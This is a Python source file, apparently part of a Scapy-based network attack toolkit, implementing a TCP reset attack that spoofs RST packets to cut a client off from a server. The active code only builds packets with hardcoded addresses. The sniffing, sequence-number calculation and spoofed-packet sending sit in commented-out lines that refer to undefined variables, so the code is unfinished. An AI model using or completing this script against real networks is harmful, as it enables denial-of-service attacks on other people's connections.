#!/usr/bin/env python3
from scapy.all import *
from .Client import Client, NetAttrs


# giving usage information
def reset_usage(exit_num=None):
    usg = "Run a TCP reset attack. Disconnects client from server by spoofing\n"
    usg += "a reset packet from the client to the server. This will cause the\n"
    usg += "server to drop packets from the client\n\n"
    usg += "Requires: Server/Client IP, Interface"
    print(usg)


# run attack
def tcp_reset(client, src, dst, tcp_rst_count=5):
    fin_found = False

    l0, l1 = client.gen_layers(layers=[0, 1], src=src, dst=dst)
    p = l0 / l1
    p.show()
    client.add_options(
        p, {
            'Ether': {
                'src': '0a:00:27:00:00:02',
                'dst': '0a:00:27:00:00:01'
            },
            'IP': {
                'src': '192.168.1.4',
                'dst': '192.168.1.3'
            }
        })
    p.show()
    # while not fin_found:
        # # capturing a packet with the source and destination provided
        # pack = sniff(iface=intface, count=1, lfilter=lambda x:
                     # x.haslayer(TCP) and
                     # x.haslayer(Raw) and
                     # x[IP].src == src.ip and
                     # x[IP].dst == dst.ip and
                     # len(x[TCP].payload) > 0)[0]

    #     # calculating sequence numbers
    #     max_seq = pack[TCP].seq + tcp_rst_count * pack[TCP].window
    #     seqs = range(pack[TCP].seq, max_seq, len(pack[TCP].payload))[1:]

    #     # generating spoofed packets
    #     p = IP(src=client_ip, dst=server_ip) / \
    #         TCP(sport=pack[TCP].sport, dport=pack[TCP].dport, flags="R")

    #     # sending spoofed packets with calculated seq num
    #     for seq in seqs:
    #         p.seq = seq
    #         send(p, verbose=0)

    #     fin_found = True
